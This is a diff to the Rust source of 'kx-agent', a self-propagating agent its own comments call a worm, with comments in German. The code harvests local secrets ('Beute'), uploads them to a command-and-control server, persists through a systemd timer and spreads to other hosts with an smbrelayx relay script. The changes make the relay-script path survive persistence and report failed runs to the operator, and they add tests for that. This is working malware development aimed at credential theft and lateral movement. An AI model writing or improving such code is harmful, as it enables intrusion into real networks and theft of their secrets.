@@ -103,6 +103,11 @@ impl Args {
     ///
     /// `--server-key` ist Teil der Liste: ohne ihn meldet der neu gestartete
     /// Agent die Beute im Klartext an den C2.
+    ///
+    /// `--relay-script` ist ebenfalls Teil der Liste: ohne sie fällt der
+    /// persistierte Agent auf den relativen Default `assets/smbrelayx.py`
+    /// zurück und löst ihn gegen sein Arbeitsverzeichnis auf — nicht gegen
+    /// das Verzeichnis des Binaries, in dem das Asset liegt.
     fn persistence_invocation(&self, exe: PathBuf) -> Invocation {
         let mut args = vec![
             "--server".to_string(),
@@ -130,6 +135,11 @@ impl Args {
             args.push("--server-key".to_string());
             args.push(schluessel.clone());
         }
+        // Der Pfad wird fest eingetragen, damit der persistierte Agent das
+        // Asset unabhängig vom Arbeitsverzeichnis findet.
+        let relay_script = resolve_relay_script(&self.relay_script, exe.parent());
+        args.push("--relay-script".to_string());
+        args.push(relay_script.to_string_lossy().to_string());
         Invocation {
             name: "kx-agent".to_string(),
             binary_path: exe,
@@ -140,6 +150,39 @@ impl Args {
             ],
         }
     }
+}
+
+/// Löst den Pfad des Relay-Skripts auf.
+///
+/// Ein relativer Pfad wird zuerst **neben dem Binary** gesucht — dort liegt
+/// das Asset im Betrieb (`<binary-verzeichnis>/assets/smbrelayx.py`). Findet
+/// sich dort nichts, bleibt der relative Pfad stehen; er löst sich dann gegen
+/// das Arbeitsverzeichnis des Prozesses auf.
+///
+/// `basis` ist das Verzeichnis, in dem gesucht wird: das Verzeichnis des
+/// Binaries, nicht das Arbeitsverzeichnis.
+fn resolve_relay_script(script: &str, basis: Option<&std::path::Path>) -> PathBuf {
+    let kandidat = PathBuf::from(script);
+    if kandidat.is_absolute() {
+        return kandidat;
+    }
+    if let Some(basis) = basis {
+        let neben_dem_binary = basis.join(&kandidat);
+        if neben_dem_binary.exists() {
+            return neben_dem_binary;
+        }
+    }
+    kandidat
+}
+
+/// Das Verzeichnis, in dem das Binary liegt.
+///
+/// `current_exe` löst Symlinks auf — der Pfad zeigt damit auf die Stelle, an
+/// der das Binary wirklich liegt, nicht auf einen Symlink im `PATH`.
+fn binary_verzeichnis() -> Option<PathBuf> {
+    std::env::current_exe()
+        .ok()
+        .and_then(|exe| exe.parent().map(|dir| dir.to_path_buf()))
 }
 
 #[tokio::main]
@@ -187,6 +230,10 @@ async fn main() {
     // Der Agent ist selbst ein Host — sein eigener Master-Key wird mit der
     // Selbst-Registrierung gemeldet.
     let eigenes = sealer.as_ref().and_then(|s| s.seal_for_host());
+    // Merkt sich, ob der C2-Server den Host kennt. Ohne Selbstregistrierung
+    // zeigt die Beute auf einen Host, den der Server nicht kennt — der Lauf
+    // hat dann nichts erreicht.
+    let mut registrierung_ok = true;
     let self_registration = kx_core::c2::RegisterRequest {
         host_id: host_id.clone(),
         ip: host_id.clone(),
@@ -200,17 +247,21 @@ async fn main() {
     };
     if let Err(e) = client.register_host(&self_registration).await {
         error!("Selbst-Registrierung fehlgeschlagen: {e}");
+        registrierung_ok = false;
     }
 
     // 1. Lokale Secrets extrahieren (je nach Plattform).
     let local_secrets = collect_local_secrets(&host_id, eigenes).await;
+    let mut hochgeladen = 0usize;
     for s in &local_secrets {
-        if let Err(e) = client.upload_secret(s).await {
-            error!("Secret-Upload fehlgeschlagen: {e}");
+        match client.upload_secret(s).await {
+            Ok(()) => hochgeladen += 1,
+            Err(e) => error!("Secret-Upload fehlgeschlagen: {e}"),
         }
     }
     info!(
-        "{} lokale Secrets extrahiert und hochgeladen",
+        "{} von {} lokalen Secrets hochgeladen",
+        hochgeladen,
         local_secrets.len()
     );
 
@@ -270,8 +321,16 @@ async fn main() {
         }
     };
 
-    let results =
-        propagate::run_propagation(&discovered, &args.relay_script, sealer.as_ref()).await;
+    // Das Asset liegt neben dem Binary; ein relativer Pfad löst sich sonst
+    // gegen das Arbeitsverzeichnis des Prozesses auf — unter systemd ist das
+    // das Wurzelverzeichnis.
+    let relay_script = resolve_relay_script(&args.relay_script, binary_verzeichnis().as_deref());
+    let results = propagate::run_propagation(
+        &discovered,
+        &relay_script.to_string_lossy(),
+        sealer.as_ref(),
+    )
+    .await;
 
     // 4. Neuentdeckte Hosts an den C2-Server melden.
     for h in &results.new_hosts {
@@ -295,6 +354,20 @@ async fn main() {
         results.new_hosts.len(),
         results.new_secrets.len()
     );
+
+    // Ein Lauf, der nichts erreicht, darf nicht als Erfolg melden. Der
+    // systemd-Timer startet den nächsten Lauf ohnehin — aber ein
+    // fehlgeschlagener Lauf muss im Journal als Fehlschlag stehen, sonst
+    // merkt der Betreiber erst beim Blick ins Dashboard, dass der Wurm
+    // längst tot ist.
+    if !registrierung_ok {
+        error!("Der Lauf hat den C2-Server nicht erreicht — der Agent meldet Fehlschlag");
+        std::process::exit(1);
+    }
+    if !local_secrets.is_empty() && hochgeladen == 0 {
+        error!("Kein einziger Secret-Upload geklappt — der Agent meldet Fehlschlag");
+        std::process::exit(1);
+    }
 }
 
 /// Extrahiert Secrets vom lokalen Host (Windows oder POSIX).
@@ -441,12 +514,54 @@ mod tests {
             "--end",
             "--own-ip",
             "--server-key",
+            "--relay-script",
         ] {
             assert!(
                 joined.contains(flag),
                 "{flag} fehlt in der Invocation: {joined}"
             );
         }
+    }
+
+    /// Das Relay-Skript wird neben dem Binary gesucht.
+    ///
+    /// Das Asset liegt im Betrieb neben dem Binary. Ein relativer Pfad, der
+    /// sich gegen das Arbeitsverzeichnis des Prozesses auflöst, findet es
+    /// unter systemd nicht — dort ist das Arbeitsverzeichnis `/`.
+    #[test]
+    fn der_relay_pfad_wird_neben_dem_binary_gesucht() {
+        let basis = std::env::temp_dir().join(format!("kx-agent-test-{}", std::process::id()));
+        let asset_dir = basis.join("assets");
+        std::fs::create_dir_all(&asset_dir).expect("Testverzeichnis");
+        std::fs::write(asset_dir.join("smbrelayx.py"), "# leer").expect("Testdatei");
+
+        let gefunden = resolve_relay_script("assets/smbrelayx.py", Some(&basis));
+        assert_eq!(
+            gefunden,
+            asset_dir.join("smbrelayx.py"),
+            "das Asset wurde nicht neben dem Binary gefunden"
+        );
+
+        std::fs::remove_dir_all(&basis).ok();
+    }
+
+    /// Ohne das Asset neben dem Binary bleibt der relative Pfad stehen.
+    ///
+    /// Der Rückfall ist der bisherige Wert: der Pfad löst sich gegen das
+    /// Arbeitsverzeichnis des Prozesses auf.
+    #[test]
+    fn ohne_asset_neben_dem_binary_bleibt_der_relative_pfad() {
+        let basis = std::env::temp_dir().join(format!("kx-agent-leer-{}", std::process::id()));
+        std::fs::create_dir_all(&basis).expect("Testverzeichnis");
+
+        let gefunden = resolve_relay_script("assets/smbrelayx.py", Some(&basis));
+        assert_eq!(
+            gefunden,
+            PathBuf::from("assets/smbrelayx.py"),
+            "der relative Pfad wurde nicht beibehalten"
+        );
+
+        std::fs::remove_dir_all(&basis).ok();
     }
 
     #[test]
